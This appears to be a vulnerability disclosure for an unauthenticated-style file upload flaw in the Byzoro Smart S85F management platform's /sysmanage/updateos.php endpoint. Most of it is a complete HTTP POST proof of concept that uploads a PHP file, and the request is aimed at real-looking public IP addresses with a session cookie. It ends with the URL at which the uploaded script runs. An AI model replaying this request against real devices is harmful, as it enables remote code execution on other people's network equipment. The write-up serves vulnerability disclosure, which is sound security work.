A file upload vulnerability exists on the Smart S85F management platform

official website:https://www.byzoro.com/

Vulnerability url:/sysmanage/updateos.php

Version:Smart S85F ALL Verison

See the login page.

![WPS图片(1)](https://github.com/Meizhi-hua/cve/assets/61043007/46450072-c38c-4868-8cdf-f7233f992c5f)

Construct the POC and upload the file successfully

POC：
```
POST /sysmanage/updateos.php? HTTP/1.1
Host: 222.180.2.66:8443
Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 597
Origin: https://222.180.2.66:8443
Referer: https://222.180.2.66:8443/sysmanage/licence.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_file_upload"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

set
-----------------------------42328904123665875270630079328—
```
![WPS图片(2)](https://github.com/Meizhi-hua/cve/assets/61043007/d372cdd6-7e86-48d4-aa6a-39f03fbcc1ff)

Access address:
 https://60.29.117.204:8443/home/1.php
![WPS图片(3)](https://github.com/Meizhi-hua/cve/assets/61043007/af6ce282-c619-4778-bcf7-9c5d75305c03)

 
